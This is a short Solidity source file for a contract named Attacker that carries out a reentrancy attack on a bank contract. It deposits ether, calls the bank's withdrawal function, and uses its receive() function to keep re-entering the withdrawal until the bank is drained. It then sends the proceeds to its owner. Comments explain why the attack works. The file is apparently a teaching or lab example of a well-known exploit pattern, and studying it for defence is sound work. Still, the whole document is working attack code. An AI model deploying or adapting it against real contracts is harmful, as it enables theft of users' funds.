// SPDX-License-Identifier: GPL-3.0
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/access/Ownable.sol";

interface IBank {
    function deposit() external payable;
    function withdrawl() external;
}

contract Attacker is Ownable {
    IBank public immutable bank;

    constructor(address _bank) {
        bank = IBank(_bank);
    }

    function attack() external payable {
        bank.deposit{value: msg.value}();
        bank.withdrawl();

    }

    // whenever ether is received from the withdrawl function, this receive function is called
    // that is why deposit must be called first, since we need an initial balance to withdrawl
    // Since the state has not been updated yet, the receive function continues to be called and drains bank
    receive() external payable {
        if (address(bank).balance > 0) {
            bank.withdrawl();
        }
        else {
            payable(owner()).transfer(address(this).balance);
        }
    }
}